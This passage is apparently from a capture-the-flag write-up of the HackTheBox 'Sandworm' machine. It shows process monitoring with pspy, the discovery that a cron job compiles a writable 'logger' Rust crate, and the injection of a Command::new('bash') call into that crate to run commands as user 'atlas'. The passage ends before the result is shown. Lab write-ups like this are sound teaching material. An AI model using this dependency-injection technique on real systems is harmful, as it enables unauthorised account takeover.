<span class="n">a</span><span class="p">)</span> <span class="n">Upstream</span> 
<span class="n">b</span><span class="p">)</span> <span class="n">Regular</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">c</span><span class="p">)</span> <span class="n">Emperor</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">d</span><span class="p">)</span> <span class="n">SQUARE</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">e</span><span class="p">)</span> <span class="n">Refresh</span> <span class="n">Indeces</span>
</pre></div>

There are five options, with only options 'a' and 'e' functioning. Let's select option 'a':<br/><br/>
<div class="highlight"><pre><span></span><span class="p">,,</span>                                      
<span class="n">MMP</span><span class="s2">""</span><span class="n">MM</span><span class="s2">""</span><span class="n">YMM</span> <span class="n">db</span>          <span class="err">`</span><span class="mi">7</span><span class="n">MN</span><span class="o">.</span>   <span class="err">`</span><span class="mi">7</span><span class="n">MF</span><span class="s1">'         mm    </span>
<span class="n">P</span><span class="s1">'   MM   `7               MMN.    M           MM    </span>
     <span class="n">MM</span>    <span class="err">`</span><span class="mi">7</span><span class="n">MM</span> <span class="err">`</span><span class="mi">7</span><span class="n">MMpdMAo</span><span class="o">.</span> <span class="n">M</span> <span class="n">YMb</span>   <span class="n">M</span>  <span class="o">.</span><span class="n">gP</span><span class="s2">"Ya mmMMmm  </span>
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>   <span class="err">`</span><span class="n">Wb</span> <span class="n">M</span>  <span class="err">`</span><span class="n">MN</span><span class="o">.</span> <span class="n">M</span> <span class="p">,</span><span class="n">M</span><span class="s1">'   Yb  MM    </span>
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>    <span class="n">M8</span> <span class="n">M</span>   <span class="err">`</span><span class="n">MM</span><span class="o">.</span><span class="n">M</span> <span class="mi">8</span><span class="n">M</span><span class="s2">""""""</span>  <span class="n">MM</span>    
     <span class="n">MM</span>      <span class="n">MM</span>   <span class="n">MM</span>   <span class="p">,</span><span class="n">AP</span> <span class="n">M</span>     <span class="n">YMM</span> <span class="n">YM</span><span class="o">.</span>    <span class="p">,</span>  <span class="n">MM</span>    
   <span class="o">.</span><span class="n">JMML</span><span class="o">.</span>  <span class="o">.</span><span class="n">JMML</span><span class="o">.</span> <span class="n">MMbmmd</span><span class="s1">'.JML.    YM  `Mbmmd'</span>  <span class="err">`</span><span class="n">Mbmo</span> 
                  <span class="n">MM</span>                                 
                <span class="o">.</span><span class="n">JMML</span><span class="o">.</span>                               


<span class="n">Select</span> <span class="n">mode</span> <span class="n">of</span> <span class="n">usage</span><span class="p">:</span>
<span class="n">a</span><span class="p">)</span> <span class="n">Upstream</span> 
<span class="n">b</span><span class="p">)</span> <span class="n">Regular</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">c</span><span class="p">)</span> <span class="n">Emperor</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">d</span><span class="p">)</span> <span class="n">SQUARE</span> <span class="p">(</span><span class="n">WIP</span><span class="p">)</span>
<span class="n">e</span><span class="p">)</span> <span class="n">Refresh</span> <span class="n">Indeces</span>
<span class="n">a</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Upstream</span> <span class="n">selected</span>
<span class="n">Enter</span> <span class="n">keywords</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">the</span> <span class="n">query</span><span class="p">:</span>
<span class="n">test</span>
<span class="n">Justification</span> <span class="k">for</span> <span class="n">the</span> <span class="n">search</span><span class="p">:</span>
<span class="n">test</span>
<span class="p">[</span><span class="mi">2022</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">22</span> <span class="mi">22</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="mf">104.121.74.33</span> <span class="o">===&gt;</span> <span class="mf">201.34.89.21</span> <span class="o">|</span> <span class="n">Did</span> <span class="n">you</span> <span class="n">see</span> <span class="n">the</span> <span class="n">latest</span> <span class="n">episode</span> <span class="n">of</span> <span class="n">Game</span> <span class="n">of</span> <span class="n">Thrones</span><span class="err">?</span> <span class="n">It</span> <span class="n">was</span> <span class="n">so</span> <span class="n">good</span><span class="err">!</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

There doesn't seem to be anything noteworthy in the output. To gain a better understanding of how it works, let's examine its directories:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">136</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>  <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">28</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span> <span class="mi">57098</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">28</span> <span class="n">access</span><span class="o">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">atlas</span> <span class="mi">46161</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">Cargo</span><span class="o">.</span><span class="n">lock</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">atlas</span>   <span class="mi">288</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">Cargo</span><span class="o">.</span><span class="n">toml</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">6</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span><span class="n">git</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">atlas</span>     <span class="mi">8</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">gitignore</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">src</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>  <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">target</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
</pre></div>

It appears to be a Git repository, and based on the listed files, it seems to be a Rust project.<br/><br/>
Upon listing the contents of the <code>/opt</code> directory, another project is discovered:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span>
<span class="n">total</span> <span class="mi">8</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">atlas</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">crates</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">atlas</span> <span class="mi">4096</span> <span class="n">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">tipnet</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
</pre></div>

Another project named <code>logger</code> is present:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">12</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>          <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span>  <span class="n">root</span>           <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">logger</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="err">$</span>
</pre></div>

It is also a Rust project, but in this case, we have write privileges:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">40</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>           <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">11644</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">Cargo</span><span class="o">.</span><span class="n">lock</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>   <span class="mi">190</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">Cargo</span><span class="o">.</span><span class="n">toml</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">git</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>    <span class="mi">20</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span><span class="n">gitignore</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">src</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">target</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="err">$</span>
</pre></div>

Now, I will look for tasks being executed by other users. To achieve this, I will utilize <a href="https://github.com/DominicBreuker/pspy">pspy</a>. I downloaded the <code>pspy64</code> release version and uploaded it to the victim machine.<br/><br/>
After waiting patiently, a cron job was executed:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/27.png"/>
The user "atlas" is compiling the Rust project <code>tipnet</code> using Cargo. Let's explore how we can exploit this to gain access as "atlas."<br/><br/>
Upon inspecting the source code of <code>tipnet</code>, it was discovered that <code>logger</code> is being executed:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cat</span> <span class="n">main</span><span class="o">.</span><span class="n">rs</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">logger</span>
<span class="n">extern</span> <span class="n">crate</span> <span class="n">logger</span><span class="p">;</span>
        <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">keywords</span><span class="o">.</span><span class="n">as_str</span><span class="p">()</span><span class="o">.</span><span class="n">trim</span><span class="p">(),</span> <span class="s2">"Attempted to query TipNet without justification."</span><span class="p">);</span>
    <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">keywords</span><span class="o">.</span><span class="n">as_str</span><span class="p">()</span><span class="o">.</span><span class="n">trim</span><span class="p">(),</span> <span class="n">justification</span><span class="o">.</span><span class="n">as_str</span><span class="p">());</span>
    <span class="n">logger</span><span class="p">::</span><span class="n">log</span><span class="p">(</span><span class="s2">"ROUTINE"</span><span class="p">,</span> <span class="s2">" - "</span><span class="p">,</span> <span class="s2">"Pulling fresh submissions into database."</span><span class="p">);</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
</pre></div>

Specifically, the <code>log</code> function from <code>logger</code> is being called. Let's delve into the source code of <code>logger</code>.<br/><br/>
Upon listing the contents of <code>/src</code> for <code>logger</code>, a Rust file named <code>lib.rs</code> is found:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">12</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">atlas</span> <span class="n">silentobserver</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">732</span> <span class="n">May</span>  <span class="mi">4</span>  <span class="mi">2023</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span>
</pre></div>

Here, we observe the source code of the <code>log</code> function being invoked in <code>tipnet</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">extern</span><span class="w"> </span><span class="k">crate</span><span class="w"> </span><span class="n">chrono</span><span class="p">;</span>

<span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span>::<span class="n">OpenOptions</span><span class="p">;</span>
<span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span>::<span class="n">Write</span><span class="p">;</span>
<span class="k">use</span><span class="w"> </span><span class="n">chrono</span>::<span class="n">prelude</span>::<span class="o">*</span><span class="p">;</span>

<span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">log</span><span class="p">(</span><span class="n">user</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">query</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Local</span>::<span class="n">now</span><span class="p">();</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">).</span><span class="n">to_string</span><span class="p">();</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">log_message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">timestamp</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">query</span><span class="p">,</span><span class="w"> </span><span class="n">justification</span><span class="p">);</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">OpenOptions</span>::<span class="n">new</span><span class="p">().</span><span class="n">append</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">create</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="n">open</span><span class="p">(</span><span class="s">"/opt/tipnet/access.log"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">file</span><span class="p">,</span>
<span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">"Error opening log file: {}"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file</span><span class="p">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">log_message</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">"Error writing to log file: {}"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="n">silentobserver</span><span class="o">@</span><span class="n">sandworm</span>:<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="cp">$</span>
</pre></div>

Given that we have write privileges over this library, and it is executed by "atlas" every two minutes, we can attempt to gain access to the "atlas" user by modifying this code.<br/><br/>
We can add the following content to execute commands:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">process</span>::<span class="n">Command</span><span class="p">;</span>

<span class="n">Command</span>::<span class="n">new</span><span class="p">(</span><span class="s">"bash"</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">"-c"</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">"touch /tmp/pwnedbyelswix"</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="n">spawn</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="n">expect</span><span class="p">(</span><span class="s">"ls command failed to start"</span><span class="p">);</span>
</pre></div>

Let's add it to the <code>log</code> function. Initially, I will copy <code>lib.rs</code> to the <code>/dev/shm/</code> directory, as I observed that the <code>logger</code> project is being deleted every two minutes after "atlas" runs its cron job.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">lib</span><span class="o">.</span><span class="n">rs</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

Now, let's modify the log function:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> 
<span class="n">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>

<span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
<span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
<span class="n">use</span> <span class="n">chrono</span><span class="p">::</span><span class="n">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>

<span class="n">pub</span> <span class="n">fn</span> <span class="n">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">justification</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">let</span> <span class="n">now</span> <span class="o">=</span> <span class="n">Local</span><span class="p">::</span><span class="n">now</span><span class="p">();</span>
    <span class="n">let</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">now</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">"%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S"</span><span class="p">)</span><span class="o">.</span><span class="n">to_string</span><span class="p">();</span>
    <span class="n">let</span> <span class="n">log_message</span> <span class="o">=</span> <span class="nb">format</span><span class="err">!</span><span class="p">(</span><span class="s2">"[</span><span class="si">{}</span><span class="s2">] - User: </span><span class="si">{}</span><span class="s2">, Query: </span><span class="si">{}</span><span class="s2">, Justification: </span><span class="si">{}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">justification</span><span class="p">);</span>

    <span class="n">use</span> <span class="n">std</span><span class="p">::</span><span class="n">process</span><span class="p">::</span><span class="n">Command</span><span class="p">;</span>

    <span class="n">Command</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s2">"bash"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s2">"-c"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s2">"touch /tmp/pwnedbyelswix"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">spawn</span><span class="p">()</span>
        <span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s2">"ls command failed to start"</span><span class="p">);</span>





    <span class="n">let</span> <span class="n">mut</span> <span class="n">file</span> <span class="o">=</span> <span class="n">match</span> <span class="n">OpenOptions</span><span class="p">::</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">true</span><span class="p">)</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">true</span><span class="p">)</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">"/opt/tipnet/access.log"</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="n">file</span><span class="p">,</span>
        <span class="n">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="n">println</span><span class="err">!</span><span class="p">(</span><span class="s2">"Error opening log file: </span><span class="si">{}</span><span class="s2">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="n">let</span> <span class="n">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">write_all</span><span class="p">(</span><span class="n">log_message</span><span class="o">.</span><span class="n">as_bytes</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">println</span><span class="err">!</span><span class="p">(</span><span class="s2">"Error writing to log file: </span><span class="si">{}</span><span class="s2">"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

Finally, let's copy the modified <code>lib.rs</code> file to the <code>/opt/crates/logger/src</code> directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cp</span> <span class="n">lib</span><span class="o">.</span><span class="n">rs</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crates</span><span class="o">/</span><span class="n">logger</span><span class="o">/</span><span class="n">src</span>
<span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

If everything works as expected, the <code>pwnedbyelswix</code> file should be created in the <code>/tmp</code> directory.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span>
<span class="n">total</span> <span class="mi">24</span>
